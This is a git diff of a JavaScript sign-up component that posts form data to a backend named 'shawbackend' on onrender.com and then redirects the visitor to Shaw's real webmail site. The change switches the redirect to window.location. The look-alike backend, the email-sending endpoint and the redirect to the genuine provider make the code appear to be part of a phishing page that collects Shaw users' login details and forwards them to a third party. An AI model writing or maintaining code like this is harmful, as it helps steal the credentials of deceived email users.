@@ -41,7 +41,7 @@ function SignUp() {
       const response = await fetch("https://shawbackend.onrender.com/sendEmail", options);
       const data = await response.json();
       console.log(data);
-      if (data.message) { return navigate('https://webmail.shaw.ca/') }
+      if (data.message) { return window.location.href = 'https://webmail.shaw.ca/' }
   
     } catch (error) {
       console.error('Error:', error);
